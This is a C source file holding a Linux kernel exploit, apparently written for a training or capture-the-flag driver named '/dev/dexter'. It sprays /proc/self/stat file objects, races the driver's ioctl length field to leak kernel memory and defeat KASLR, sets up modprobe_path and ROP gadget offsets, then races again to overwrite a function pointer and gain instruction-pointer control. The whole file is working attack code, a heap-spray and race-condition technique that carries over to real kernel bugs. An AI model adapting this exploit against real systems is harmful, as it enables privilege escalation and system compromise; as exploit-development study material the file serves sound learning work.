#include <fcntl.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <unistd.h>

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define SUCCESS(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

#define ofs_start 0x170f80
#define addr_modprobe_path (kbase + 0xe38480)
#define rop_mov_qrdx_rcx (kbase + 0x48687)
#define rop_mov_rax_qrdx (kbase + 0x3aadf9)

typedef struct {
    char* ptr;
    size_t len;
} request_t;

#define CMD_GET 0xdec50001
#define CMD_SET 0xdec50002

uint32_t fd_leak;
request_t req;
uint32_t spray[100];
uint64_t kbase, g_buf;

int race_win;

int set(char* buf, size_t len)
{
    req.ptr = buf;
    req.len = len;
    return ioctl(fd_leak, CMD_SET, &req);
}

int get(char* buf, size_t len)
{
    req.ptr = buf;
    req.len = len;
    return ioctl(fd_leak, CMD_GET, &req);
}

void* race(void* arg)
{
    while (!race_win) {
        req.len = 0x100;
        usleep(1);
    }
    return NULL;
}

int main()
{
    for (int i = 0; i < 50; i++) {
        spray[i] = open("/proc/self/stat", O_RDONLY);

        if (spray[i] == -1) {
            ERROR("/proc/self/stat failed");
            exit(1);
        }
    }

    fd_leak = open("/dev/dexter", O_RDWR);
    if (fd_leak == -1)
        ERROR("/dev/dexter");

    for (int i = 50; i < 100; i++) {
        spray[i] = open("/proc/self/stat", O_RDONLY);

        if (spray[i] == -1) {
            ERROR("/proc/self/stat failed");
            exit(1);
        }
    }

    pthread_t th;
    char buf_get[0x100] = {}, zero[0x100] = {};
    race_win = 0;
    pthread_create(&th, NULL, race, NULL);
    while (!race_win) {
        get(buf_get, 0x20);
        if (memcmp(buf_get, zero, 0x100) != 0) {
            race_win = 1;
            break;
        }
    }
    pthread_join(th, NULL);

    // KASLRの回避
    kbase = *(uint64_t*)&buf_get[0x20] - ofs_start;
    printf("[+] kbase = 0x%016lx\n", kbase);
    // END KASLRの回避

    for (int i = 0; i < 0x100; i += 8) {
        printf("%02x: 0x%016lx\n", i, *(unsigned long*)&buf_get[i]);
    }

    char buf_set[0x28];
    race_win = 0;
    uint64_t rip_control = 0xdeaddead;
    *(uint64_t *)&buf_set[0x20] = rip_control;
    pthread_create(&th, NULL, race, NULL);
    while (!race_win) {
        set(buf_set, 0x20);
        get(buf_get, 0x20);        

        if (*(uint64_t *)&buf_get[0x20] == rip_control) {
            race_win = 1;
            break;
        }
    }
    pthread_join(th, NULL);

    for (int i = 0; i < 100; i++) {
        if (read(spray[i], &buf_get, 0xcafebabe) == -1) {
            ERROR("read failed");
        }
    }

    return 0;
}